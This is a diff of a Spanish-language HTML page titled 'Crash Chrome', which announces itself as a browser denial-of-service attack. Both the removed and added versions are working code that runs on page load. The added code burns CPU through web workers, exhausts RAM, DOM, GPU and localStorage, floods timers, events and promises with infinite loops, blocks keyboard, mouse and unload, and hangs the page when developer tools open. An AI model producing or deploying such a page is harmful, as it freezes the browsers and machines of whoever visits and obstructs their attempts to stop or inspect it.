@@ -3,126 +3,385 @@
 <head>
     <meta charset="UTF-8">
     <title>Crash Chrome - Denegación de Servicio</title>
-    <script>
+    <style>
+        body {
+            background: black;
+            color: red;
+            font-family: monospace;
+            overflow: hidden;
+            margin: 0;
+            padding: 20px;
+        }
+        .crash-status {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            z-index: 9999;
+            color: lime;
+            font-size: 12px;
+            background: rgba(0,0,0,0.8);
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid lime;
+        }
+    </style>
+</head>
+<body>
+    <div class="crash-status">
+        <h2>🔥 MODO CRASH ACTIVADO 🔥</h2>
+        <p>El navegador se congelará en segundos...</p>
+        <p id="stats"></p>
+    </div>
 
-        setInterval(function() {
-            window.location.href = window.location.href;
-        }, 1);
+    <script>
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+            return '';
+        });
         
-     
-        setInterval(function() {
-            for (let i = 0; i < 100; i++) {
-                const div = document.createElement('div');
-                div.style.width = '10px';
-                div.style.height = '10px';
-                div.style.backgroundColor = '#ff0000';
-                div.style.margin = '1px';
-                document.body.appendChild(div);
-            }
-        }, 10);
+        window.location.href = function() { return '#'; };
         
-     
-        function burnCPU() {
-            let x = 0;
-            while (true) {
-                x++;
-                Math.sqrt(Math.random() * 10000000) + Math.sin(x) + Math.log(x);
+        window.onunload = function() { while(true) {} };
+        
+        function killCPU() {
+            console.log('🔥 Iniciando quemado de CPU...');
+            const start = Date.now();
+            const threads = [];
+            
+            try {
+                const blob = new Blob([`
+                    while(true) {
+                        let x = 0;
+                        while(x < 1000000) {
+                            Math.sqrt(Math.random() * 1000000000);
+                            Math.sin(Math.random() * 1000);
+                            Math.cos(Math.random() * 1000);
+                            Math.tan(Math.random() * 1000);
+                            Math.log(Math.random() * 1000);
+                            Math.exp(Math.random() * 1000);
+                            Math.pow(Math.random() * 1000, Math.random() * 10);
+                            x++;
+                        }
+                    }
+                `]);
                 
-                if (x % 1000000 === 0) {
-                    setTimeout(burnCPU, 0);
-                    break;
+                const blobURL = URL.createObjectURL(blob);
+                
+                for(let i = 0; i < 8; i++) {
+                    try {
+                        const worker = new Worker(blobURL);
+                        threads.push(worker);
+                    } catch(e) {}
+                }
+            } catch(e) {}
+            
+            while(true) {
+                for(let i = 0; i < 1000000; i++) {
+                    const a = Math.random() * 1000000;
+                    const b = Math.random() * 1000000;
+                    const c = Math.sqrt(a * b);
+                    const d = Math.sin(c) * Math.cos(c);
+                    const e = Math.tan(d) * Math.log(Math.abs(d) + 1);
+                    const f = Math.exp(e) * Math.pow(a, b % 10);
+                    const g = Math.asin(Math.min(0.99, Math.abs(f % 1)));
+                    const h = Math.acos(Math.min(0.99, Math.abs(g % 1)));
+                    const result = Math.atan(h) * Math.atan2(a, b + 1);
+                    
+                    const obj = {
+                        a: result,
+                        b: [result, result, result],
+                        c: { d: result, e: [result, result] },
+                        d: new Date(),
+                        e: new RegExp('.*' + result + '.*')
+                    };
+                    
+                    JSON.stringify(obj);
+                    JSON.parse(JSON.stringify(obj));
+                    
+                    const arr = new Array(10000);
+                    arr.fill(result);
+                    arr.sort();
+                    arr.reverse();
+                    arr.map(x => x * result);
+                    arr.filter(x => x > result);
                 }
             }
         }
         
-        setTimeout(burnCPU, 100);
-        
-        setInterval(function() {
-            const massiveArray = [];
-            for (let i = 0; i < 10000; i++) {
-                massiveArray.push(new Array(1000).fill('datos de memoria'));
-            }
-        }, 500);
-        
-        setInterval(function() {
-            const xhr = new XMLHttpRequest();
-            xhr.open('GET', window.location.href, true);
-            xhr.send();
-        }, 10);
-        
-        setInterval(function() {
-            window.open(window.location.href, '_blank', 'width=300,height=300');
-        }, 100);
-        
-        const style = document.createElement('style');
-        style.textContent = `
-            div {
-                animation: spin 0.1s linear infinite;
-            }
-            @keyframes spin {
-                from { transform: rotate(0deg); }
-                to { transform: rotate(360deg); }
-            }
-        `;
-        document.head.appendChild(style);
-        
-        setInterval(function() {
-            for (let i = 0; i < 100; i++) {
-                localStorage.setItem('key' + i, 'x'.repeat(1024 * 1024)); 
-            }
-        }, 1000);
-        
-        for (let i = 0; i < 1000; i++) {
-            window.addEventListener('scroll', function() {
-                document.body.style.backgroundColor = '#' + Math.floor(Math.random()*16777215).toString(16);
-            });
-        }
-        
-        for (let i = 0; i < 1000; i++) {
+        function killRAM() {
+            console.log('💾 Saturando memoria RAM...');
+            const memoryHogs = [];
+            
             setInterval(function() {
-                console.log('Timer ' + i + ' ejecutándose');
+                try {
+                    for(let i = 0; i < 100; i++) {
+                        const hog = {
+                            data: new Array(1000000).fill('X'.repeat(1000)),
+                            matrix: new Array(1000).fill().map(() => new Array(1000).fill(Math.random())),
+                            strings: new Array(10000).fill('A'.repeat(10000)),
+                            buffers: new Array(100).fill().map(() => new Uint8Array(10000000)),
+                            dates: new Array(100000).fill().map(() => new Date()),
+                            regexps: new Array(100000).fill().map(() => new RegExp('.*' + Math.random() + '.*')),
+                            functions: new Array(100000).fill().map(() => new Function('return ' + Math.random())),
+                            objects: {}
+                        };
+                        
+                        for(let j = 0; j < 100; j++) {
+                            hog.objects['key' + j] = {
+                                value: Math.random(),
+                                child: {
+                                    value: Math.random(),
+                                    child: {
+                                        value: Math.random()
+                                    }
+                                }
+                            };
+                        }
+                        
+                        memoryHogs.push(hog);
+                    }
+                } catch(e) {
+                }
             }, 1);
         }
         
-        console.warn('⚠️ Esta página está diseñada para saturar recursos del navegador. ¡Cierra esta pestaña si no quieres que tu navegador se congele!');
-    </script>
-</head>
-<body>
-    <h1 style="color: red; text-align: center;">⚠️ SATURACIÓN DE RECURSOS ACTIVADA ⚠️</h1>
-    <p style="text-align: center; font-size: 18px;">Esta página está consumiendo activamente:</p>
-    <ul style="list-style: none; text-align: center; font-size: 16px;">
-        <li>🔥 CPU (procesamiento infinito)</li>
-        <li>💾 RAM (creación masiva de elementos)</li>
-        <li>🔄 Red (redirecciones y solicitudes AJAX)</li>
-        <li>📦 Almacenamiento local (localStorage)</li>
-        <li>🎨 GPU (animaciones CSS pesadas)</li>
-    </ul>
-    <script>
-        setInterval(function() {
-            const stats = document.createElement('p');
-            stats.style.position = 'fixed';
-            stats.style.bottom = '10px';
-            stats.style.right = '10px';
-            stats.style.backgroundColor = 'rgba(0,0,0,0.7)';
-            stats.style.color = 'white';
-            stats.style.padding = '10px';
-            stats.style.borderRadius = '5px';
-            stats.style.zIndex = '9999';
-            
-            const memory = performance.memory ? 
-                (performance.memory.usedJSHeapSize / 1048576).toFixed(2) + ' MB' : 
-                'No disponible';
-            
-            stats.innerHTML = `Elementos en DOM: ${document.body.children.length}<br>
-                              Memoria usada: ${memory}<br>
-                              Timers activos: ~1000+`;
-            
-            document.body.appendChild(stats);
-            
-            if (document.body.children.length > 1000) {
-                document.body.removeChild(document.body.children[0]);
+        function killDOM() {
+            console.log('📦 Saturando DOM...');
+            setInterval(function() {
+                try {
+                    for(let i = 0; i < 1000; i++) {
+                        const element = document.createElement('div');
+                        element.style.position = 'absolute';
+                        element.style.left = Math.random() * 100 + '%';
+                        element.style.top = Math.random() * 100 + '%';
+                        element.style.width = '1px';
+                        element.style.height = '1px';
+                        element.style.backgroundColor = 'red';
+                        element.style.opacity = '0.1';
+                        element.setAttribute('data-random', Math.random().toString(36).repeat(1000));
+                        
+                        element.addEventListener('mouseover', function(e) {
+                            for(let j = 0; j < 1000; j++) {
+                                Math.sqrt(Math.random() * 1000000);
+                            }
+                        });
+                        
+                        element.addEventListener('click', function(e) {
+                            while(true) {
+                                Math.random();
+                            }
+                        });
+                        
+                        document.body.appendChild(element);
+                        
+                        const child = document.createElement('span');
+                        child.textContent = 'X'.repeat(10000);
+                        element.appendChild(child);
+                        
+                        const grandchild = document.createElement('p');
+                        grandchild.textContent = 'Y'.repeat(10000);
+                        child.appendChild(grandchild);
+                    }
+                } catch(e) {}
+            }, 1);
+        }
+        
+        function killTimers() {
+            console.log('⏰ Creando timers infinitos...');
+            for(let i = 0; i < 10000; i++) {
+                setTimeout(function() {
+                    while(true) {
+                        Math.random();
+                    }
+                }, 0);
+                
+                setInterval(function() {
+                    for(let j = 0; j < 10000; j++) {
+                        Math.sqrt(Math.random() * 1000000);
+                        Math.sin(Math.random() * 1000000);
+                        Math.cos(Math.random() * 1000000);
+                    }
+                }, 0);
             }
-        }, 1000);
+        }
+        
+        function killEvents() {
+            console.log('🔄 Generando eventos infinitos...');
+            
+            setInterval(function() {
+                for(let i = 0; i < 1000; i++) {
+                    const event = new Event('customEvent' + i);
+                    window.dispatchEvent(event);
+                    
+                    const mouseEvent = new MouseEvent('mousemove', {
+                        clientX: Math.random() * 10000,
+                        clientY: Math.random() * 10000
+                    });
+                    document.dispatchEvent(mouseEvent);
+                    
+                    const keyboardEvent = new KeyboardEvent('keydown', {
+                        key: 'a',
+                        code: 'KeyA'
+                    });
+                    document.dispatchEvent(keyboardEvent);
+                }
+            }, 1);
+            
+            for(let i = 0; i < 1000; i++) {
+                window.addEventListener('customEvent' + i, function() {
+                    while(true) {
+                        Math.random();
+                    }
+                });
+            }
+        }
+        
+        function killGPU() {
+            console.log('🎮 Saturando GPU...');
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 10000;
+                canvas.height = 10000;
+                document.body.appendChild(canvas);
+                
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if(gl) {
+                    setInterval(function() {
+                        for(let i = 0; i < 1000; i++) {
+                            const texture = gl.createTexture();
+                            gl.bindTexture(gl.TEXTURE_2D, texture);
+                            
+                            const pixels = new Uint8Array(10000000);
+                            for(let j = 0; j < pixels.length; j++) {
+                                pixels[j] = Math.floor(Math.random() * 256);
+                            }
+                            
+                            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1000, 1000, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
+                            
+                            const vertexShader = gl.createShader(gl.VERTEX_SHADER);
+                            const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
+                            
+                            const vertexCode = 'void main() { gl_Position = vec4(1.0); }';
+                            const fragmentCode = 'void main() { gl_FragColor = vec4(1.0); }';
+                            
+                            gl.shaderSource(vertexShader, vertexCode);
+                            gl.shaderSource(fragmentShader, fragmentCode);
+                            
+                            gl.compileShader(vertexShader);
+                            gl.compileShader(fragmentShader);
+                        }
+                    }, 1);
+                }
+            } catch(e) {}
+        }
+        
+        function killStorage() {
+            console.log('💿 Saturando localStorage...');
+            setInterval(function() {
+                try {
+                    for(let i = 0; i < 1000; i++) {
+                        const key = 'key_' + Math.random() + '_' + i;
+                        const value = 'X'.repeat(5 * 1024 * 1024); 
+                        localStorage.setItem(key, value);
+                    }
+                } catch(e) {
+                    try {
+                        localStorage.clear();
+                    } catch(e) {}
+                }
+            }, 1);
+        }
+        
+        function killPromises() {
+            console.log('🔄 Creando promesas infinitas...');
+            setInterval(function() {
+                for(let i = 0; i < 1000; i++) {
+                    new Promise((resolve, reject) => {
+                        while(true) {
+                            Math.random();
+                            if(Math.random() > 0.999) resolve();
+                        }
+                    }).then(() => {
+                        while(true) {
+                            Math.random();
+                        }
+                    });
+                }
+            }, 1);
+        }
+        
+        function killNetwork() {
+            console.log('🌐 Saturando red...');
+            setInterval(function() {
+                for(let i = 0; i < 100; i++) {
+                    try {
+                        const img = new Image();
+                        img.src = 'data:image/svg+xml,' + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" width="10000" height="10000"><rect width="10000" height="10000" fill="red"/></svg>'.repeat(1000));
+                        
+                        const script = document.createElement('script');
+                        script.src = 'data:text/javascript,' + encodeURIComponent('while(true){Math.random();}'.repeat(1000));
+                        
+                        const link = document.createElement('link');
+                        link.rel = 'stylesheet';
+                        link.href = 'data:text/css,' + encodeURIComponent('*{animation:spin 0s infinite;}'.repeat(1000));
+                        
+                        document.head.appendChild(script);
+                        document.head.appendChild(link);
+                        document.body.appendChild(img);
+                    } catch(e) {}
+                }
+            }, 1);
+        }
+        
+        function infiniteRecursion(depth = 0) {
+            return infiniteRecursion(depth + 1) + infiniteRecursion(depth + 2);
+        }
+        
+        console.log('🚀 INICIANDO ATAQUE DE DENEGACIÓN DE SERVICIO...');
+        
+        setTimeout(() => { killCPU(); }, 100);
+        setTimeout(() => { killRAM(); }, 200);
+        setTimeout(() => { killDOM(); }, 300);
+        setTimeout(() => { killTimers(); }, 400);
+        setTimeout(() => { killEvents(); }, 500);
+        setTimeout(() => { killGPU(); }, 600);
+        setTimeout(() => { killStorage(); }, 700);
+        setTimeout(() => { killPromises(); }, 800);
+        setTimeout(() => { killNetwork(); }, 900);
+        setTimeout(() => { infiniteRecursion(); }, 1000);
+        
+        setInterval(function() {
+            const stats = document.getElementById('stats');
+            try {
+                const memory = performance.memory ? 
+                    (performance.memory.usedJSHeapSize / 1073741824).toFixed(2) + ' GB' : 
+                    'No disponible';
+                
+                stats.innerHTML = `
+                    Elementos DOM: ${document.body.children.length}<br>
+                    Memoria RAM: ${memory}<br>
+                    Timers: ~10000+<br>
+                    Eventos: ~1000+<br>
+                    CPU: 100% 🔥<br>
+                    Estado: CRASHEANDO...
+                `;
+            } catch(e) {}
+        }, 100);
+        
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => e.preventDefault());
+        document.addEventListener('mousedown', e => e.preventDefault());
+        
+        setInterval(function() {
+            const before = new Date();
+            debugger;
+            const after = new Date();
+            if (after - before > 100) {
+                while(true) {}
+            }
+        }, 100);
+        
     </script>
 </body>
 </html>
